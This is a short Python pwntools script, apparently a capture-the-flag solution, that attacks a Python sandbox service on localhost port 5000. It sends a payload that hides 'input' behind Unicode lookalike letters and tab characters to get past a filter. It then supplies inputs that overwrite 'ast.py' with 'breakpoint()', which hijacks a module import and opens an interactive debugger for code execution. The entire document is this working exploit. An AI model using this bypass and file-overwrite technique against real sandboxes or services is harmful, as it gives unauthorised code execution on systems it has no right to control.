from pwn import *

io = remote("localhost", 5000)

payload = '''[ open\t(\t i𝖓put\t(),i𝖓put\t() \t ).\t write(i𝖓put\t() \t ),\tD]'''
inps = ['ast.py', 'w', 'breakpoint()']

io.sendline(payload.encode())
for i in inps:
    io.sendline(i.encode())
io.interactive()
